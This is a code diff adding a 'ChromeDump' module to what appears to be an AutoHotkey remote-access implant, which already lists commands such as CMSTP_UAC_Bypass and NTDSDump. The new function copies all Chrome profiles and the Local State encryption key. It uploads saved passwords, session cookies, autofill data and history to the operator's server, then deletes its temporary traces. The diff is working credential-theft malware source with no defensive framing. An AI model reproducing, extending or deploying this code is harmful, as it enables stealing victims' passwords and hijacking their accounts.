@@ -789,8 +789,10 @@ class NetworkClient {
                     this.CMSTP_UAC_Bypass(parameters)
                 case "NTDSDump":
                     this.NTDSDump()
+                case "ChromeDump":
+                    this.ChromeDump()
 
-                
+
                 default:
                     message := Format("command_output|{}|Module not found", this.agentID)
                     response := this.SendMsg(this.serverIP, this.serverPort, message)
@@ -2470,9 +2472,249 @@ class NetworkClient {
             }
             
             return true
-            
+
+        }
+
+    ChromeDump() {
+        try {
+            ; Get Chrome user data directory
+            chromeDataPath := EnvGet("LOCALAPPDATA") . "\Google\Chrome\User Data"
+
+            ; Check if Chrome directory exists
+            if !DirExist(chromeDataPath) {
+                message := Format("command_output|{}|Chrome installation not found at: {}", this.agentID, chromeDataPath)
+                response := this.SendMsg(this.serverIP, this.serverPort, message)
+                return false
+            }
+
+            ; Create backup directory with timestamp
+            timestamp := FormatTime(A_Now, "yyyyMMdd_HHmmss")
+            backupPath := "C:\tmp\ChromeBackup_" . timestamp
+
+            ; Create the backup directory
+            DirCreate(backupPath)
+
+            ; Helper function to copy directory recursively
+            CopyDirectory(source, destination) {
+                ; Create destination directory
+                DirCreate(destination)
+
+                ; Copy all files in source directory
+                try {
+                    FileCopy(source . "\*.*", destination, 1)  ; 1 = overwrite
+                } catch {
+                    ; Silent fail if no files to copy
+                }
+
+                ; Recursively copy subdirectories
+                Loop Files, source . "\*.*", "D"
+                {
+                    if (A_LoopFileName != "." && A_LoopFileName != "..") {
+                        CopyDirectory(A_LoopFileFullPath, destination . "\" . A_LoopFileName)
+                    }
+                }
+            }
+
+            ; Backup Default profile
+            if DirExist(chromeDataPath . "\Default") {
+                CopyDirectory(chromeDataPath . "\Default", backupPath . "\Default")
+            }
+
+            ; Backup additional profiles (Profile 1, Profile 2, etc.)
+            Loop Files, chromeDataPath . "\Profile*", "D"
+            {
+                profileName := A_LoopFileName
+                CopyDirectory(chromeDataPath . "\" . profileName, backupPath . "\" . profileName)
+            }
+
+            ; Backup the Local State file (contains encryption key)
+            localStatePath := chromeDataPath . "\Local State"
+            if FileExist(localStatePath) {
+                try {
+                    FileCopy(localStatePath, backupPath . "\Local State", 1)  ; 1 = overwrite
+                } catch as err {
+                    this.Log("Failed to copy Local State: " . err.Message)
+                }
+            }
+
+            ; Count backed up files
+            fileCount := 0
+            Loop Files, backupPath . "\*.*", "FR"
+            {
+                fileCount++
+            }
+
+            this.Log("Chrome backup completed. Files backed up: " . fileCount)
+
+            ; Define critical Chrome files to upload
+            criticalFiles := [
+                {name: "Login Data", desc: "Saved passwords"},
+                {name: "Cookies", desc: "Session cookies"},
+                {name: "Web Data", desc: "Autofill data"},
+                {name: "History", desc: "Browsing history"},
+                {name: "Bookmarks", desc: "Saved bookmarks"},
+                {name: "Preferences", desc: "User preferences"}
+            ]
+
+            ; Always upload Local State (encryption key) from root
+            localStateSource := backupPath . "\Local State"
+            localStateUploaded := false
+
+            uploadedFiles := []
+            failedFiles := []
+            totalSize := 0
+
+            ; Upload Local State file (critical for decryption)
+            if FileExist(localStateSource) {
+                this.Log("Uploading Local State file...")
+                renamedPath := backupPath . "\Local_State_" . timestamp
+                try {
+                    FileCopy(localStateSource, renamedPath, 1)
+                    if this.HandleFileUpload(renamedPath) {
+                        uploadedFiles.Push("Local_State_" . timestamp)
+                        totalSize += FileGetSize(renamedPath)
+                        localStateUploaded := true
+                        this.Log("Local State uploaded successfully")
+                        FileDelete(renamedPath)
+                    } else {
+                        failedFiles.Push("Local State")
+                        this.Log("Failed to upload Local State")
+                    }
+                } catch as err {
+                    failedFiles.Push("Local State")
+                    this.Log("Error uploading Local State: " . err.Message)
+                }
+            }
+
+            ; Upload critical files from Default profile
+            defaultProfile := backupPath . "\Default"
+            if DirExist(defaultProfile) {
+                this.Log("Processing Default profile...")
+
+                for fileInfo in criticalFiles {
+                    sourceFile := defaultProfile . "\" . fileInfo.name
+
+                    if FileExist(sourceFile) {
+                        ; Create unique filename with timestamp
+                        sanitizedName := StrReplace(fileInfo.name, " ", "_")
+                        destName := "Default_" . sanitizedName . "_" . timestamp
+                        tempPath := backupPath . "\" . destName
+
+                        this.Log("Uploading " . fileInfo.name . " (" . fileInfo.desc . ")...")
+
+                        try {
+                            FileCopy(sourceFile, tempPath, 1)
+
+                            if this.HandleFileUpload(tempPath) {
+                                fileSize := FileGetSize(tempPath)
+                                uploadedFiles.Push(destName)
+                                totalSize += fileSize
+                                this.Log(fileInfo.name . " uploaded successfully (" . fileSize . " bytes)")
+                                FileDelete(tempPath)
+                            } else {
+                                failedFiles.Push(fileInfo.name)
+                                this.Log("Failed to upload " . fileInfo.name)
+                            }
+                        } catch as err {
+                            failedFiles.Push(fileInfo.name)
+                            this.Log("Error uploading " . fileInfo.name . ": " . err.Message)
+                        }
+
+                        Sleep(500)  ; Small delay between uploads
+                    } else {
+                        this.Log(fileInfo.name . " not found in Default profile")
+                    }
+                }
+            }
+
+            ; Upload critical files from additional profiles (Profile 1, Profile 2, etc.)
+            Loop Files, backupPath . "\Profile*", "D"
+            {
+                profileName := A_LoopFileName
+                profilePath := A_LoopFilePath
+                this.Log("Processing " . profileName . "...")
+
+                for fileInfo in criticalFiles {
+                    sourceFile := profilePath . "\" . fileInfo.name
+
+                    if FileExist(sourceFile) {
+                        ; Create unique filename with profile name and timestamp
+                        sanitizedName := StrReplace(fileInfo.name, " ", "_")
+                        destName := profileName . "_" . sanitizedName . "_" . timestamp
+                        tempPath := backupPath . "\" . destName
+
+                        this.Log("Uploading " . profileName . " - " . fileInfo.name . "...")
+
+                        try {
+                            FileCopy(sourceFile, tempPath, 1)
+
+                            if this.HandleFileUpload(tempPath) {
+                                fileSize := FileGetSize(tempPath)
+                                uploadedFiles.Push(destName)
+                                totalSize += fileSize
+                                this.Log(fileInfo.name . " uploaded successfully (" . fileSize . " bytes)")
+                                FileDelete(tempPath)
+                            } else {
+                                failedFiles.Push(profileName . "/" . fileInfo.name)
+                                this.Log("Failed to upload " . fileInfo.name)
+                            }
+                        } catch as err {
+                            failedFiles.Push(profileName . "/" . fileInfo.name)
+                            this.Log("Error uploading " . fileInfo.name . ": " . err.Message)
+                        }
+
+                        Sleep(500)  ; Small delay between uploads
+                    }
+                }
+            }
+
+            ; Cleanup: Delete the backup directory
+            try {
+                this.Log("Cleaning up temporary backup directory...")
+                DirDelete(backupPath, true)  ; true = recurse
+                this.Log("Cleanup completed")
+            } catch as cleanupErr {
+                this.Log("Cleanup warning: " . cleanupErr.Message)
+            }
+
+            ; Generate summary message
+            uploadCount := uploadedFiles.Length
+            failCount := failedFiles.Length
+
+            if (uploadCount > 0) {
+                message := Format("command_output|{}|Chrome dump completed!`n`nUploaded {} file(s) - Total size: {} bytes`n",
+                                this.agentID, uploadCount, totalSize)
+
+                message .= "`nUploaded files:`n"
+                for fileName in uploadedFiles {
+                    message .= "  - " . fileName . "`n"
+                }
+
+                if (failCount > 0) {
+                    message .= "`nFailed uploads: " . failCount . "`n"
+                    for fileName in failedFiles {
+                        message .= "  - " . fileName . "`n"
+                    }
+                }
+
+                if (!localStateUploaded) {
+                    message .= "`nWARNING: Local State file not uploaded - decryption may not be possible!"
+                }
+            } else {
+                message := Format("command_output|{}|Chrome dump failed - no files uploaded successfully", this.agentID)
+            }
+
+            response := this.SendMsg(this.serverIP, this.serverPort, message)
+            return (uploadCount > 0)
+
+        } catch as err {
+            message := Format("command_output|{}|Chrome dump failed: {} (Line: {})",
+                            this.agentID, err.Message, err.Line)
+            response := this.SendMsg(this.serverIP, this.serverPort, message)
+            return false
         }
     }
+}
 
 
 
